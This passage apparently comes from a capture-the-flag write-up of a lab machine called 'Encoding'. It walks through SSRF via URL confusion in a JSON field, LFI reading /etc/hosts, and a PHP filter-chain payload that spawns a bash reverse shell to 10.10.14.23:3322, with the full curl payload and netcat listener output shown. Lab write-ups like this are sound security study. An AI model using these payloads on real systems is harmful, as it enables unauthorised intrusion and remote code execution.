</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> <span class=s2>&#34;http://haxtables.htb/handler.php&#34;</span> -H <span class=s2>&#34;Content-Type: application/json&#34;</span> -d <span class=s1>&#39;{&#34;action&#34;: &#34;b64encode&#34;, &#34;data&#34;: &#34;hello world&#34;, &#34;uri_path&#34;: &#34;@image.haxtables.htb&#34;}&#39;</span>
</span></span><span class=line><span class=cl>&lt;!DOCTYPE html&gt;
</span></span><span class=line><span class=cl>&lt;html&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;style&gt;
</span></span><span class=line><span class=cl>body, html <span class=o>{</span>
</span></span><span class=line><span class=cl>  height: 100%<span class=p>;</span>
</span></span><span class=line><span class=cl>  margin: 0<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>.bgimg <span class=o>{</span>
</span></span><span class=line><span class=cl>  background-image: url<span class=o>(</span><span class=s1>&#39;/assets/img/forestbridge.jpg&#39;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  height: 100%<span class=p>;</span>
</span></span><span class=line><span class=cl>  background-position: center<span class=p>;</span>
</span></span><span class=line><span class=cl>  background-size: cover<span class=p>;</span>
</span></span><span class=line><span class=cl>  position: relative<span class=p>;</span>
</span></span><span class=line><span class=cl>  color: white<span class=p>;</span>
</span></span><span class=line><span class=cl>  font-family: <span class=s2>&#34;Courier New&#34;</span>, Courier, monospace<span class=p>;</span>
</span></span><span class=line><span class=cl>  font-size: 25px<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>.topleft <span class=o>{</span>
</span></span><span class=line><span class=cl>  position: absolute<span class=p>;</span>
</span></span><span class=line><span class=cl>  top: 0<span class=p>;</span>
</span></span><span class=line><span class=cl>  left: 16px<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>.bottomleft <span class=o>{</span>
</span></span><span class=line><span class=cl>  position: absolute<span class=p>;</span>
</span></span><span class=line><span class=cl>  bottom: 0<span class=p>;</span>
</span></span><span class=line><span class=cl>  left: 16px<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>.middle <span class=o>{</span>
</span></span><span class=line><span class=cl>  position: absolute<span class=p>;</span>
</span></span><span class=line><span class=cl>  top: 50%<span class=p>;</span>
</span></span><span class=line><span class=cl>  left: 50%<span class=p>;</span>
</span></span><span class=line><span class=cl>  transform: translate<span class=o>(</span>-50%, -50%<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  text-align: center<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>hr <span class=o>{</span>
</span></span><span class=line><span class=cl>  margin: auto<span class=p>;</span>
</span></span><span class=line><span class=cl>  width: 40%<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>&lt;/style&gt;
</span></span><span class=line><span class=cl>&lt;body&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;div <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;bgimg&#34;</span>&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  &lt;div <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;middle&#34;</span>&gt;
</span></span><span class=line><span class=cl>    &lt;h1&gt;COMING SOON&lt;/h1&gt;
</span></span><span class=line><span class=cl>    &lt;hr&gt;
</span></span><span class=line><span class=cl>    &lt;p&gt;35 days left&lt;/p&gt;
</span></span><span class=line><span class=cl>  &lt;/div&gt;
</span></span><span class=line><span class=cl>&lt;/div&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;/body&gt;
</span></span><span class=line><span class=cl>&lt;/html&gt;
</span></span></code></pre></td></tr></table></div></div><p>We&rsquo;ve successfully bypassed the URI path restriction, and used SSRF to be able to hit <code>http://image.haxtables.htb</code>, despite this being blocked within the Apache config. We can now try <code>/actions/action_handler?page=/etc/hosts</code> &ndash; appending a <code>&</code> so the <code>/index.php</code> added within the <code>make_api_call()</code> function will be discarded and treated as a query param rather than part of the path:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> <span class=s2>&#34;http://haxtables.htb/handler.php&#34;</span> -H <span class=s2>&#34;Content-Type: application/json&#34;</span> -d <span class=s1>&#39;{&#34;action&#34;: &#34;b64encode&#34;, &#34;data&#34;: &#34;hello world&#34;, &#34;uri_path&#34;: &#34;user@image.haxtables.htb/actions/action_handler.php?page=/etc/hosts&amp;&#34;}&#39;</span> 
</span></span><span class=line><span class=cl>127.0.0.1 localhost
</span></span><span class=line><span class=cl>127.0.1.1 encoding
</span></span><span class=line><span class=cl>127.0.0.1 haxtables.htb api.haxtables.htb image.haxtables.htb
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># The following lines are desirable for IPv6 capable hosts</span>
</span></span><span class=line><span class=cl>::1     ip6-localhost ip6-loopback
</span></span><span class=line><span class=cl>fe00::0 ip6-localnet
</span></span><span class=line><span class=cl>ff00::0 ip6-mcastprefix
</span></span><span class=line><span class=cl>ff02::1 ip6-allnodes
</span></span><span class=line><span class=cl>ff02::2 ip6-allrouters
</span></span></code></pre></td></tr></table></div></div><p>Excellent!.. So we&rsquo;re able to use domain confusion starting with <code>user@</code> and ending with <code>&</code> to to inject our own URL achieving SSRF, and calling the <code>/actions/action_handler.php?page=/etc/hosts&</code> URL on the image host, which includes the <code>page</code> we specify &ndash; <code>/etc/hosts</code> in this instance (another LFI).</p><p>Let&rsquo;s see how else we can exploit the <code>include($page);</code> in <code>/actions/action_handler.php</code>. One option is log poisoning &ndash; which allows us to take LFI and turn it into Remote Code Execution (RCE).</p><p>We could, for example, poison a log (e.g. apache access log) with a dangerous string such as <code>&lt;?php shell_exec('..'); ?></code>, then do LFI, so PHP will <code>include</code> this file, parsing and executing our dangerous string/code in an otherwise innocuous file. I looked at <code>APACHE_LOG_DIR</code> in <code>/etc/apache2/envvars</code>, which pointed at <code>/var/log/apache2</code>, but I couldn&rsquo;t find the expected log file at <code>/var/log/apache2/access.log</code>. I spent a bit of time here trying unsucccessfully locate logs we could poison.</p><p>Another LFI2RCE option is via PHP filters as per <a href=https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters target=_blank rel="noopener noreffer">LFI2RCE via PHP Filters - HackTricks</a> and <a href=https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it.html target=_blank rel="noopener noreffer">PHP filters chain: What is it and how to use it</a>. Essentially, if we achieve LFI, we can specify a file using the <code>php://</code> URI e.g. <code>php://filter/[..]/resource=test.txt</code>. Our byte stream for file <code>test.txt</code> will pass through the filters specified within <code>[..]</code></p><p>These filters, particularly <code>convert.iconv.*</code> will process stream data with <code>iconv()</code> &ndash; allowing us to convert our stream from some input encoding to another output encoding. Quite often, this conversion will result in characters being <em>prepended</em> to the existing stream. Given the name of the machine, it seems this is likely the intended path to gaining a foothold.</p><p>By chaining (with <code>|</code>) these filters together, we can use LFI to load a file from disk, and prepend arbitrary characters to this file stream &ndash; such that an <code>include</code> will allow us to include and execute arbitrary code in addition to including the file contents loaded from disk.</p><p>Our script on <a href=https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters target=_blank rel="noopener noreffer">HackTricks</a> contains a mapping of conversions, where for each value of arbtirary code we wish to load, we include the required filter chain. Better yet, Synacktive provide a script <a href=https://github.com/synacktiv/php_filter_chain_generator target=_blank rel="noopener noreffer">here</a> covering alphanumerics and some other special characters &ndash; more than enough!. Running the script to get a filter chain for our PHP reverse shell <code>&lt;?php system('bash -c \"bash -i >& /dev/tcp/10.10.14.23/3322 0>&amp;1\"'); ?></code> (output not shown due to length):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$python</span> php_filter_chain_generator.py --chain <span class=s2>&#34;&lt;?php system(&#39;bash -c \&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.23/3322 0&gt;&amp;1\&#34;&#39;); ?&gt;&#34;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> The following gadget chain will generate the following code : &lt;?php system<span class=o>(</span><span class=s1>&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.23/3322 0&gt;&amp;1&#34;&#39;</span><span class=o>)</span><span class=p>;</span> ?&gt; <span class=o>(</span>base64 value: PD9waHAgc3lzdGVtKCdiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjIzLzMzMjIgMD4mMSInKTsgPz4<span class=o>)</span>
</span></span></code></pre></td></tr></table></div></div><p>Now, Let&rsquo;s use LFI and SSRF with our generated chained PHP filter, which in <code>/actions/action_handler.php</code> will use <code>include()</code> to load the filtered temp file (we can even create arbitrary temp bytestreams to load with <code>php://temp</code> &ndash; no need for read access to a known file on disk!) executing our reverse shell (PHP filter chain shown here in full within the <code>page</code> query param):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -v <span class=s2>&#34;http://haxtables.htb/handler.php&#34;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>-H <span class=s2>&#34;Content-Type: application/json&#34;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>-d @- <span class=s>&lt;&lt; EOF
</span></span></span><span class=line><span class=cl><span class=s>{
</span></span></span><span class=line><span class=cl><span class=s>    &#34;action&#34;: &#34;b64encode&#34;,
</span></span></span><span class=line><span class=cl><span class=s>    &#34;data&#34;: &#34;hello world&#34;,
</span></span></span><span class=line><span class=cl><span class=s>    &#34;uri_path&#34;: &#34;user@image.haxtables.htb/actions/action_handler.php?page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;&#34;
</span></span></span><span class=line><span class=cl><span class=s>}
</span></span></span><span class=line><span class=cl><span class=s>EOF</span>
</span></span></code></pre></td></tr></table></div></div><p>Back in our netcat listener on port 3322:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$nc</span> -lvnp <span class=m>3322</span>
</span></span><span class=line><span class=cl>Listening on 0.0.0.0 <span class=m>3322</span>
</span></span><span class=line><span class=cl>Connection received on 10.10.11.198 <span class=m>36524</span>
</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>816<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>www-data@encoding:~/image/actions$ ls -la /home
</span></span><span class=line><span class=cl>ls -la /home
</span></span><span class=line><span class=cl>total <span class=m>12</span>
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>3</span> root root <span class=m>4096</span> Jan <span class=m>13</span> 16:25 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>19</span> root root <span class=m>4096</span> Jan <span class=m>13</span> 16:25 ..
